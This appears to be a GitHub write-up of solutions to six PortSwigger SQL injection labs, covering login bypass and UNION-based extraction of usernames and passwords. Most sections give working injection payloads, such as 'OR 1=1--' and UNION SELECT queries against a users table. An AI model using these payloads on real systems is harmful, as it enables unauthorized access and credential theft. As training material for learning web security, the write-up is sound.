## Summary
- [Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://github.com/Sec0gh/Portswigger-Labs/tree/main/SQL%20Injection%20Labs/In-Band%20SQL%20Injection#lab1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
- [Lab2: SQL injection vulnerability allowing login bypass](https://github.com/Sec0gh/Portswigger-Labs/tree/main/SQL%20Injection%20Labs/In-Band%20SQL%20Injection#lab2-sql-injection-vulnerability-allowing-login-bypass)
- [SQL injection UNION attacks](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/In-Band%20SQL%20Injection/README.md#sql-injection-union-attacks)
	- [Lab3: SQL injection UNION attack, determining the number of columns returned by the query](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/In-Band%20SQL%20Injection/README.md#lab3-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
	- [Lab4: SQL injection UNION attack, finding a column containing text](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/In-Band%20SQL%20Injection/README.md#lab4-sql-injection-union-attack-finding-a-column-containing-text)
	- [Lab5: SQL injection UNION attack, retrieving data from other tables](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/In-Band%20SQL%20Injection/README.md#lab5-sql-injection-union-attack-retrieving-data-from-other-tables)
	- [Lab6: SQL injection UNION attack, retrieving multiple values in a single column](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/In-Band%20SQL%20Injection/README.md#lab6-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)

## `Notice:` I suggest being familiar with SQL before reading the labs solutions.

### Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- In the first, If we set this specific character `'`, the server will reply with `Internal Server Error`.
- Because when we will set it, the query in the backend will be like that :

```SQL
SELECT * FROM products WHERE category = ''' AND released = 1
```
- But we can use some tricks to inject this parameter.

```
category=any_category' OR 1=1--
category=' OR 1=1--
```
- Here, we terminated the single quotes of category parameter.
- And we used an `OR` logical operator and the equation of `1=1`, and this equation will always be true, so now we don’t have to know category as whatever be the category if we set or not.
- After that, we added the comment sequence `--` causes the remainder of the query to be ignored.
- So the query will show all category items and will be like that:

```SQL
SELECT * FROM products WHERE category = 'any_category' OR 1=1--' AND released = 1
```
-----------------------------------------------------------------------

### Lab2: SQL injection vulnerability allowing login bypass
- Many applications that implement a forms-based login function use a database to store user credentials and perform a simple SQL query to validate each login attempt like this query:

```SQL
SELECT * FROM users WHERE username = 'admin' AND password = 'admin'
```
- Try injecting this payload.

```
username=administrator'--
```
- Again, When we set `--`, it will ignore the remainder of the query and the password check is bypassed.
- It is called `subverting or altering application logic`.
- The query will be like that after injecting in the backend:

```SQL
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
##### Take note for another solution:
- Suppose that the attacker does not know the administrator’s username. In most applications, the first account in the database is an administrative user, because this account normally is created manually and then is used to generate all other accounts via the application.
- So we will log in as the first user in the database who is the administrator by supplying this as input to the username parameter:

```
username=' OR 1=1--
```
- The query will be like that and will let you log in as the first user who is the `administrator` and also the password check is bypassed.

```SQL
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = ''
```

-----------------------------------------------------------------------
## SQL injection UNION attacks
### Lab3: SQL injection UNION attack, determining the number of columns returned by the query
>  `Note:` To combine two `select` statements with the `UNION`  operator:
>  1. We must return the same number of columns in the 2 `select` statements.
>  2. The 2 quires result must have the same or compatible data types, appearing in the same order.

- So one of the most common ways to detect the number of columns in the select statement is using the `NULL` values. 
- There is another way with using the `order by clause`.
- But we will use the first way because of the `NULL` value can be converted to any data type.
- Here, when I tried to test the number of columns, I got an error: `Internal server error`.
 
```
category='union select null--
category='union select null,null--
```
 - But when I tried three values of `NULL`, the injected query succeeded.
 
```
category='union select null,null,null--
```

-----------------------------------------------------------------------

### Lab4: SQL injection UNION attack, finding a column containing text

- As usual in the first, I tried to identify a number of columns, and I detected there are three columns combined in the query when I injected the `UNION` operator.

```
category='union select null,null,null--
```
- The second step I want to identify the data type of the columns, but I will focus on the string data because the important and interesting data will be in the string columns.
- So I tried to set string data in the first column, and when it will be combined with the first column in the query of the application it will return an error if the results are not compatible with the same data types.
- Here, I got an error because the first column is not from the string data type.

```
' union select 'VlA8XYl',null,null--
```
- But on the second try, the payload is interpreted successfully, and the second column returned data from the `string` data type.  

```
' union select null,'VlA8XYl',null--
```

-----------------------------------------------------------------------

### Lab5: SQL injection UNION attack, retrieving data from other tables
1. Testing number of columns:

```
category=' union select null,null--
```
2. Testing which column holds data with `string` data type:

```
category=' union select 'hello',null--
```
- In real-world scenarios, you must know the names of the tables and columns containing the data you want to access, in the next labs we will know how to know that, but in this lab description, we know the name of the table and the columns which we will retrieve.
3. And the last phase is retrieving the data from the `user` table:

```
category=' union select username, password from users--
```
- Here we can see the results from my injected query, and now we can log in as the `administrator` user.

![lab5.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/In-Band%20SQLi%20images/lab5.png)

-----------------------------------------------------------------------
### Lab6: SQL injection UNION attack, retrieving multiple values in a single column
- We will try to detect the number of columns and data type of each column as usual.

```
1. category=' union select null,null--
2. category=' union select null,'hello'--
```
- I detected the second column is a `string`, but how we can retrieve the username and password when we have just one column receive string data!!
- And if we tried to retrieve the data with this query it will make an error:
```
category=' union select username, password from users--
```
- Because the first column is not string data type.
- The solution for this problem is combining the results of the 2 columns in one column by concatenating them with `||`.

```
category=' union select null, username ||'~'|| password from users--
```
- `Note:` You can set any specific character to separate columns other than `~`.

![lab6.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/In-Band%20SQLi%20images/lab6.png)

- Or you can make something like that by concatenating😃
```
category=' union select null, 'User: '|| username ||' and password: '|| password from users--
```

![lab6_another_form.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/In-Band%20SQLi%20images/lab6_another_form.png)
